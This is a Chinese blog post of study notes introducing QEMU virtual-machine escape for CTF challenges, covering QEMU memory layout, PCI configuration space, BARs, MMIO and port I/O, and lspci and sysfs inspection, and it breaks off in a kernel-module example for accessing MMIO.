<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Qemu逃逸初识 | S1nec-1o's B1og</title><meta name="author" content="s1nec-1o"><meta name="copyright" content="s1nec-1o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="qemu逃逸学习CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个pci外设，例如键盘控制器之类？通过构造特定的Guest操作触发漏洞（一般是越界读写），最终在Host上获得shell读取flag，主要还是侧重于代码的逆向和漏洞的利用技巧。 实战中的或许是类似于针对云服务商的？目标是突破租户隔离，来获得宿主机的敏感信息吧，还是非常有意思滴！！！  原文：ht">
<meta property="og:type" content="article">
<meta property="og:title" content="Qemu逃逸初识">
<meta property="og:url" content="http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/index.html">
<meta property="og:site_name" content="S1nec-1o&#39;s B1og">
<meta property="og:description" content="qemu逃逸学习CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个pci外设，例如键盘控制器之类？通过构造特定的Guest操作触发漏洞（一般是越界读写），最终在Host上获得shell读取flag，主要还是侧重于代码的逆向和漏洞的利用技巧。 实战中的或许是类似于针对云服务商的？目标是突破租户隔离，来获得宿主机的敏感信息吧，还是非常有意思滴！！！  原文：ht">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png">
<meta property="article:published_time" content="2025-05-04T06:09:27.000Z">
<meta property="article:modified_time" content="2025-05-04T06:21:36.940Z">
<meta property="article:author" content="s1nec-1o">
<meta property="article:tag" content="qemu逃逸">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281712481.jpg"><link rel="canonical" href="http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"距离文章发布已经过去","messageNext":"天了，信息可能已经过时"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Qemu逃逸初识',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-04 14:21:36'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 8 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="S1nec-1o's B1og" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><nav id="nav"><span id="blog-info"><a href="/" title="S1nec-1o's B1og"><span class="site-name">S1nec-1o's B1og</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Qemu逃逸初识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-04T06:09:27.000Z" title="发表于 2025-05-04 14:09:27">2025-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-04T06:21:36.940Z" title="更新于 2025-05-04 14:21:36">2025-05-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/qemu/">qemu</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/qemu/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="qemu逃逸学习"><a href="#qemu逃逸学习" class="headerlink" title="qemu逃逸学习"></a>qemu逃逸学习</h1><p>CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个pci外设，例如键盘控制器之类？通过构造特定的Guest操作触发漏洞（一般是越界读写），最终在Host上获得shell读取flag，主要还是侧重于代码的逆向和漏洞的利用技巧。</p>
<p>实战中的或许是类似于针对云服务商的？目标是突破租户隔离，来获得宿主机的敏感信息吧，还是非常有意思滴！！！</p>
<blockquote>
<p>原文：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6166">https://xz.aliyun.com/news/6166</a></p>
<p>只做学习记录和批注</p>
<p>好文：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/</a></p>
</blockquote>
<h2 id="qemu概述"><a href="#qemu概述" class="headerlink" title="qemu概述"></a>qemu概述</h2><p>运行的每个<code>qemu</code>虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 <code>host</code> 上的一个 <code>qemu</code> 进程，而虚拟机的执行线程（如 <code>CPU</code> 线程、<code>I/O</code> 线程等）对应 <code>qemu</code> 进程的一个线程。</p>
<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250501211959652.png" alt="image-20250501211959652" style="zoom: 33%;" />

<blockquote>
<p>其中**客户机系统 (Guest)**：运行在 QEMU 之上，是虚拟机中安装的操作系统。</p>
<p>客户机系统认为自己直接运行在硬件上，但实际上是<strong>通过 QEMU 与底层硬件交互</strong>。</p>
</blockquote>
<p>qemu虚拟机内存所对应的真实内存结构如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>

<p><code>qemu</code>用于模拟设备运行，而qemu逃逸漏洞多发于<strong>模拟pci设备</strong>中，漏洞形成一般是修改<code>qemu-system</code>代码，所以漏洞存在于<code>qemu-system</code>文件内。而逃逸就是指利用漏洞从<code>qemu-system</code>模拟的这个小系统逃到主机内，从而在<code>linux</code>主机内达到命令执行的目的。</p>
<h2 id="qemu中的地址"><a href="#qemu中的地址" class="headerlink" title="qemu中的地址"></a>qemu中的地址</h2><p>从用户虚拟地址到用户物理地址，从用户物理地址到qemu虚拟地址</p>
<p>用户的物理内存实际上是<code>qemu</code>程序<code>mmap</code>出来的</p>
<p><code>-m 1G</code>也就是<code>mmap</code>一块<code>1G</code>的内存</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">       -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz-5.0.5-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append &quot;priority=low console=ttyS0&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure>

<h2 id="pci设备概述"><a href="#pci设备概述" class="headerlink" title="pci设备概述"></a>pci设备概述</h2><p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。<strong>大小为256字节</strong>，其中<strong>头部64字节是PCI标准规定</strong>的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。<strong>前16个字节的格式是一定的</strong>，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p>
<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250501230817541.png" alt="image-20250501230817541" style="zoom:33%;" />

<p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p>
<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250501230916132.png" alt="image-20250501230916132" style="zoom: 50%;" />

<p>当BAR最后一位<strong>为0表示这是映射的I&#x2F;O内存</strong>，<strong>为1是表示这是I&#x2F;O端口</strong>，当是I&#x2F;O内存的时候1-2位表示内存的类型，<strong>bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</strong></p>
<p>当最后一位为1时表示映射的I&#x2F;O端口。I&#x2F;O端口一般<strong>不支持预取</strong>，所以这里是29位的地址。</p>
<p>通过memory space访问设备I&#x2F;O的方式称为memory mapped I&#x2F;O，即<strong>MMIO</strong>，这种情况下，CPU直接使用<strong>普通访存指令即可访问设备I&#x2F;O</strong>。</p>
<p>通过I&#x2F;O space访问设备I&#x2F;O的方式称为<strong>port I&#x2F;O</strong>，或者port mapped I&#x2F;O，这种情况下CPU需要使用<strong>专门的I&#x2F;O指令如<code>IN/OUT</code>访问I&#x2F;O端口。</strong></p>
<p>在<strong>MMIO</strong>中，<strong>内存和I&#x2F;O设备共享同一个地址空间。</strong> MMIO是应用得最为广泛的一种I&#x2F;O方法，它<strong>使用相同的地址总线</strong>来处理内存和I&#x2F;O设备，I&#x2F;O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I&#x2F;O设备的内存，用于访问内存的CPU指令也可来访问I&#x2F;O设备。<strong>每个I&#x2F;O设备监视CPU的地址总线</strong>，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I&#x2F;O设备，CPU必须预留给I&#x2F;O一个地址区域，该地址区域不能给物理内存使用。</p>
<p>在<strong>PMIO</strong>中，内存和I&#x2F;O设备有各自的地址空间。 端口映射I&#x2F;O通常使用一种特殊的CPU指令，专门执行I&#x2F;O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读&#x2F;写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。<strong>I&#x2F;O设备有一个与内存不同的地址空间</strong>，为了实现地址空间的隔离，要么在CPU物理接口上<strong>增加一个I&#x2F;O引脚</strong>，要么<strong>增加一条专用的I&#x2F;O总线</strong>。由于I&#x2F;O地址空间与内存地址空间是隔离的，所以有时将<strong>PMIO称为被隔离的IO</strong>(Isolated I&#x2F;O)。</p>
<h2 id="pci设备inQemu"><a href="#pci设备inQemu" class="headerlink" title="pci设备inQemu"></a>pci设备inQemu</h2><p><strong>pci设备的寻址是由总线、设备以及功能构成。</strong>如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure>

<p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p>
<p>其中<code>[0000]</code>表示pci的域， PCI域最多可以<strong>承载256条总线</strong>。 每条总线最多可以有<strong>32个设备</strong>，每个设备最多可以<strong>有8个功能</strong>。</p>
<p>总之每个 PCI 设备有<strong>一个总线号, 一个设备号, 一个功能号标识。</strong>PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。<strong>每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备</strong>, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)<strong>有最多 8 个功能</strong>。</p>
<p>PCI 设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  <span class="number">00f</span>f</span><br><span class="line">Vendor: <span class="number">1234</span></span><br><span class="line">Device: <span class="number">11e9</span></span><br><span class="line">SVendor:        <span class="number">1</span>af4</span><br><span class="line">SDevice:        <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  Unclassified device [<span class="number">00f</span>f]</span><br><span class="line">Vendor: Vendor <span class="number">1234</span></span><br><span class="line">Device: Device <span class="number">11e9</span></span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure>

<p>查看设备内存空间：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>可以看到该设备有两个空间：<code>BAR0</code>为<code>MMIO</code>空间，地址为<code>febf1000</code>，大小为<code>256</code>；<code>BAR1</code>为<code>PMIO</code>空间，端口地址为<code>0xc050</code>，大小为<code>8</code>。</p>
<p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>resource</code>文件包含其它相应空间的数据，如<code>resource0</code>（<code>MMIO</code>空间）以及<code>resource1</code>（<code>PMIO</code>空间）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>每行分别表示相应空间的起始地址（<code>start-address</code>）、结束地址（<code>end-address</code>）以及标识位（<code>flags</code>）。</p>
<h2 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I&#x2F;O空间"></a>qemu中访问I&#x2F;O空间</h2><p>存在<code>mmio</code>与<code>pmio</code>，那么在系统中该如何访问这两个空间呢？访问<code>mmio</code>与<code>pmio</code>都可以采用<strong>在内核态访问</strong>或<strong>在用户空间编程进行访问</strong>。</p>
<h3 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h3><p>编译<strong>内核</strong>模块，在内核态访问mmio空间，示例代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span>      <span class="comment">// 提供 I/O 内存访问函数（如 readb/writeb）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span> <span class="comment">// 提供资源管理相关函数（如 request_mem_region）</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize); <span class="comment">//将物理地址 ioaddr 映射到内核的虚拟地址空间，返回虚拟地址 addr。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readb</span>(addr);  <span class="comment">// 读取 1 字节（8 位）</span></span><br><span class="line"><span class="built_in">readw</span>(addr);  <span class="comment">// 读取 2 字节（16 位）</span></span><br><span class="line"><span class="built_in">readl</span>(addr);  <span class="comment">// 读取 4 字节（32 位）</span></span><br><span class="line"><span class="built_in">readq</span>(addr);  <span class="comment">// 读取 8 字节（64 位，仅在 64 位系统支持）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">writeb</span>(val, addr);  <span class="comment">// 写入 1 字节</span></span><br><span class="line"><span class="built_in">writew</span>(val, addr);  <span class="comment">// 写入 2 字节</span></span><br><span class="line"><span class="built_in">writel</span>(val, addr);  <span class="comment">// 写入 4 字节</span></span><br><span class="line"><span class="built_in">writeq</span>(val, addr);  <span class="comment">// 写入 8 字节</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __iomem *addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 申请资源</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">request_mem_region</span>(ioaddr, iomemsize, <span 